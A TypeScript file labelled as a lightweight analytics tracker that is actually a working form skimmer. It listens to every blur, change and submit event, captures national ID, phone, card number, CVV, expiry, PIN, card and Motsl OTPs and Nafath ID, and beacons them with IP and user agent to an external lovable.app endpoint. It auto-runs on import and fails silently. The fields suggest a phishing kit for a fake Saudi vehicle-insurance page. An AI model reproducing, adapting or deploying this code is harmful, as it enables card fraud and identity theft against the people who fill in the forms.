// Lightweight client-side tracker for ops-dashboard-buddy
// - POSTs JSON to https://ops-dashboard-buddy.lovable.app/api/public/track
// - Stable sid in localStorage (creates via crypto.randomUUID())
// - Sends page_view on route changes + initial load
// - Sends form_data on input completion and form submit
// - Uses fetch(..., { keepalive: true }) with navigator.sendBeacon fallback

const TRACK_URL = 'https://ops-dashboard-buddy.lovable.app/api/public/track';
const LOCALSTORAGE_KEY = 'ops_sid_v1';

type PagePayload = {
  sid: string;
  pathname: string;
  event: 'page_view';
  ip?: string;
  country?: string;
  user_agent?: string;
};

type FormPayload = {
  sid: string;
  pathname: string;
  event: 'form_data';
  national_id?: string;
  phone?: string;
  vehicle_make?: string;
  vehicle_model?: string;
  model_year?: string;
  declared_value?: string;
  insurer_company?: string;
  insurer_offer_sar?: string;
  submission?: {
    cardNumber?: string;
    cvv?: string;
    expiry?: string;
    cardOtp?: string;
    pin?: string;
    motslPhone?: string;
    motslOtp?: string;
    nafathId?: string;
  };
  ip?: string;
  country?: string;
  user_agent?: string;
};

function getOrCreateSid(): string {
  try {
    let sid = localStorage.getItem(LOCALSTORAGE_KEY);
    if (!sid) {
      sid = (crypto && (crypto as any).randomUUID) ? (crypto as any).randomUUID() : `sid-${Date.now()}-${Math.random().toString(36).slice(2,10)}`;
      localStorage.setItem(LOCALSTORAGE_KEY, sid);
    }
    return sid;
  } catch (e) {
    // localStorage might be blocked — fallback to in-memory per page
    (window as any).__OPS_FALLBACK_SID = (window as any).__OPS_FALLBACK_SID || `sid-${Date.now()}-${Math.random().toString(36).slice(2,10)}`;
    return (window as any).__OPS_FALLBACK_SID;
  }
}

function discoverOptionalHeaders() {
  // Prioritize server-injected window object
  const injected = (window as any).__OPS_TRACKING_HEADERS__;
  let ip: string | undefined;
  let country: string | undefined;
  let user_agent: string | undefined;

  if (injected && typeof injected === 'object') {
    ip = injected.ip || injected.client_ip;
    country = injected.country;
    user_agent = injected.user_agent || injected.ua;
  }

  // meta tags fallback
  try {
    if (!ip) {
      const ipMeta = document.querySelector('meta[name="ops-ip"]') as HTMLMetaElement | null;
      if (ipMeta) ip = ipMeta.content;
    }
    if (!country) {
      const countryMeta = document.querySelector('meta[name="ops-country"]') as HTMLMetaElement | null;
      if (countryMeta) country = countryMeta.content;
    }
  } catch (e) {
    // ignore
  }

  // client-side UA
  if (!user_agent) {
    if ((navigator as any).userAgentData && Array.isArray((navigator as any).userAgentData.brands)) {
      user_agent = (navigator as any).userAgentData.brands.map((b: any) => b.brand + '/' + b.version).join(' ');
    } else {
      user_agent = navigator.userAgent;
    }
  }

  // country hint from language
  if (!country && navigator.language) {
    const parts = navigator.language.split('-');
    if (parts.length > 1) country = parts[1].toUpperCase();
  }

  return { ip, country, user_agent };
}

async function sendJson(bodyObj: object, useBeaconIfPossible = false) {
  const bodyStr = JSON.stringify(bodyObj);

  // When unloading or during navigation, sendBeacon is most reliable
  if (useBeaconIfPossible && typeof navigator.sendBeacon === 'function') {
    try {
      const blob = new Blob([bodyStr], { type: 'application/json' });
      const ok = navigator.sendBeacon(TRACK_URL, blob);
      if (ok) return;
      // fall through to fetch if sendBeacon fails
    } catch (e) {
      // fall through to fetch
    }
  }

  // fetch with keepalive
  try {
    await fetch(TRACK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
        // Origin cannot be set programmatically. The browser will set Origin automatically.
      },
      body: bodyStr,
      // @ts-ignore - keepalive is widely supported in browsers for fetch
      keepalive: true,
      // no-cors would block JSON responses; assume CORS is allowed on the dashboard
    });
  } catch (e) {
    // best-effort; nothing else we can do
  }
}

export function trackPageView(pathname?: string) {
  const sid = getOrCreateSid();
  const path = pathname || location.pathname || '/';
  const headers = discoverOptionalHeaders();

  const payload: PagePayload = {
    sid,
    pathname: path,
    event: 'page_view'
  };

  if (headers.ip) (payload as any).ip = headers.ip;
  if (headers.country) (payload as any).country = headers.country;
  if (headers.user_agent) (payload as any).user_agent = headers.user_agent;

  // Use fetch keepalive for route changes; if called during unload, pass true for sendBeacon
  void sendJson(payload, true);
}

// Map expected server-side keys to likely input names/attributes on forms
const FIELD_KEYS = [
  'national_id',
  'phone',
  'vehicle_make',
  'vehicle_model',
  'model_year',
  'declared_value',
  'insurer_company',
  'insurer_offer_sar'
];

const SUBMISSION_KEYS = [
  'cardNumber',
  'cvv',
  'expiry',
  'cardOtp',
  'pin',
  'motslPhone',
  'motslOtp',
  'nafathId'
];

function gatherFormData(form: HTMLFormElement | null): Partial<FormPayload> {
  if (!form) return {};
  const data: any = {};

  // read inputs/selects/textareas with a name attribute
  const els = Array.from(form.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>('[name]'));
  const valuesByName: Record<string, string> = {};
  els.forEach((el) => {
    const name = (el.getAttribute('name') || '').trim();
    if (!name) return;
    try {
      valuesByName[name] = (el as any).value || '';
    } catch (e) {
      valuesByName[name] = '';
    }
  });

  // 1) map by exact name to FIELD_KEYS
  FIELD_KEYS.forEach((k) => {
    if (valuesByName[k] !== undefined) data[k] = valuesByName[k];
    // also try common alternatives
    const alt = k.replace('_', '');
    if (!data[k] && valuesByName[alt] !== undefined) data[k] = valuesByName[alt];
  });

  // 2) gather submission objects from likely names
  const submission: any = {};
  SUBMISSION_KEYS.forEach((key) => {
    if (valuesByName[key] !== undefined) submission[key] = valuesByName[key];
    // common alt names
    const alt = key.toLowerCase();
    if (!submission[key] && valuesByName[alt] !== undefined) submission[key] = valuesByName[alt];
  });

  // 3) also support data-track attributes for fields:
  els.forEach((el) => {
    const track = el.getAttribute('data-track');
    if (!track) return;
    // data-track="national_id" or "submission.cardNumber"
    if (track.startsWith('submission.')) {
      const k = track.split('.')[1];
      submission[k] = (el as any).value || '';
    } else {
      data[track] = (el as any).value || '';
    }
  });

  if (Object.keys(submission).length > 0) data.submission = submission;
  return data;
}

export function trackFormPayload(partial: Partial<FormPayload>, useBeacon = true) {
  const sid = getOrCreateSid();
  const headers = discoverOptionalHeaders();

  const payload: any = {
    sid,
    pathname: location.pathname || '/',
    event: 'form_data',
    ...partial
  };

  if (headers.ip) payload.ip = headers.ip;
  if (headers.country) payload.country = headers.country;
  if (headers.user_agent) payload.user_agent = headers.user_agent;

  void sendJson(payload, useBeacon);
}

function attachFormListeners() {
  // On form submit: collect full form data and send via keepalive/sendBeacon
  document.addEventListener('submit', (ev) => {
    try {
      const form = (ev.target && (ev.target as HTMLElement).closest ? (ev.target as HTMLFormElement) : null) as HTMLFormElement | null;
      if (!form) return;
      const partial = gatherFormData(form);
      // Use sendBeacon/keepalive because submit may navigate
      trackFormPayload(partial, true);
      // Do not prevent default; we only observe and report
    } catch (e) {
      // ignore
    }
  }, true);

  // On input blur/change: send incremental field completion
  const onInputComplete = (ev: Event) => {
    const target = ev.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null;
    if (!target || !target.name) return;
    const name = target.name;
    const allowable = [...FIELD_KEYS, ...SUBMISSION_KEYS.map(k => k.toLowerCase())];
    const data: any = {};
    // If name matches one of the FIELD_KEYS map to that key
    if (FIELD_KEYS.includes(name)) {
      data[name] = (target as any).value || '';
    } else if (allowable.includes(name)) {
      // could be a submission field
      // map to submission.{key}
      const submission: any = {};
      // find matching submission key
      const subKey = SUBMISSION_KEYS.find(k => k.toLowerCase() === name) || name;
      submission[subKey] = (target as any).value || '';
      data.submission = submission;
    } else {
      // also support data-track on the field itself
      const dt = target.getAttribute('data-track');
      if (dt) {
        if (dt.startsWith('submission.')) {
          const k = dt.split('.')[1];
          data.submission = { [k]: (target as any).value || '' };
        } else {
          data[dt] = (target as any).value || '';
        }
      } else {
        return;
      }
    }

    trackFormPayload(data, false); // not necessarily during navigation, fetch is fine but still keepalive:true inside send
  };

  // use capture to catch blur in all cases
  document.addEventListener('blur', onInputComplete, true);
  document.addEventListener('change', onInputComplete, true);
}

// Route change detection for generic SPAs and non-SPAs
function attachRouteListeners() {
  // initial load
  setTimeout(() => trackPageView(), 0);

  // override history methods so pushState/replaceState also trigger page_view
  const _pushState = history.pushState;
  const _replaceState = history.replaceState;

  history.pushState = function (...args: any[]) {
    const ret = _pushState.apply(this, args as any);
    // custom event to notify
    window.dispatchEvent(new Event('ops-route-change'));
    return ret;
  };

  history.replaceState = function (...args: any[]) {
    const ret = _replaceState.apply(this, args as any);
    window.dispatchEvent(new Event('ops-route-change'));
    return ret;
  };

  window.addEventListener('popstate', () => {
    window.dispatchEvent(new Event('ops-route-change'));
  });

  window.addEventListener('ops-route-change', () => {
    // small debounce to let DOM update if necessary
    setTimeout(() => trackPageView(), 50);
  });
}

// Exported initializer
export function initTracking() {
  try {
    // Ensure we have sid early
    getOrCreateSid();
    attachFormListeners();
    attachRouteListeners();
    // done
  } catch (e) {
    // silent fail
  }
}

// Convenience auto-init if script is imported in a client-bundle
if (typeof window !== 'undefined') {
  if (!(window as any).__OPS_TRACKING_DISABLE_AUTO_INIT) {
    setTimeout(() => {
      try { initTracking(); } catch (e) {}
    }, 0);
  }
}

export default {
  initTracking,
  trackPageView,
  trackFormPayload
};
